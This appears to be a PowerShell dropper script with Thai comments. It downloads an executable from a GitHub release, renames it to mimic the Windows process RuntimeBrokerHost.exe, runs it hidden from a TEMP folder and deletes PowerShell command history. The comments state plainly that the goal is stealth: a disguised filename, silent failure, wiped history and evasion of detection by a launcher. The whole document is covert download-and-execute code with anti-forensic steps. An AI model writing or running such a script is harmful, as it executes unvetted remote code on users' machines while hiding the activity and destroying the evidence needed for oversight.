$ErrorActionPreference = "SilentlyContinue"

# 1. บังคับใช้ TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. ตั้งค่า Path และ URL
# แนะนำ: เปลี่ยนชื่อไฟล์ปลายทางให้เนียนกว่าเดิม เช่น RuntimeBrokerHost.exe
$exeName = "RuntimeBrokerHost.exe" 
$downloadUrl = "https://github.com/GRILLYje/Fishing_Moggy_public/releases/download/V1.0.2/EpicGamesLauncher.exe" 
$folderPath = "$env:TEMP\MoggySystem"
$tempPath = "$folderPath\$exeName"

# 🌟 ป้องกันการรันซ้ำ: ถ้ามี Process ชื่อนี้รันอยู่แล้ว ให้ปิดตัวเก่าก่อน หรือไม่ต้องรันซ้ำ
$checkProc = Get-Process | Where-Object { $_.Name -eq ($exeName -replace '\.exe$', '') }
if ($checkProc) {
    # เลือกเอาว่าจะ Kill ตัวเก่า หรือ Exit ตัวนี้ (แนะนำให้ Kill ตัวเก่าเพื่อ Update)
    Stop-Process -Name ($exeName -replace '\.exe$', '') -Force
}

# 3. จัดการโฟลเดอร์
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

# 4. ดาวน์โหลดไฟล์ (ใช้ Invoke-WebRequest แบบเนียนๆ)
try {
    # ลบไฟล์เก่าออกก่อนดาวน์โหลดใหม่
    if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
    
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing
} catch {
    # ถ้าพังให้เงียบที่สุด ไม่ต้องแจ้งเตือนสีแดง
    Exit
}

# 🌟 ส่วนสำคัญ: ลบประวัติ PowerShell ให้เกลี้ยงจริง
try {
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force
    Clear-History
} catch {}

# 5. รันโปรแกรมแบบซ่อนหน้าต่าง (Hidden)
# Start-Process แบบใส่ -WindowStyle Hidden จะช่วยให้ Launcher ตรวจสอบยากขึ้น
Start-Process -FilePath $tempPath -WindowStyle Hidden -WorkingDirectory $folderPath
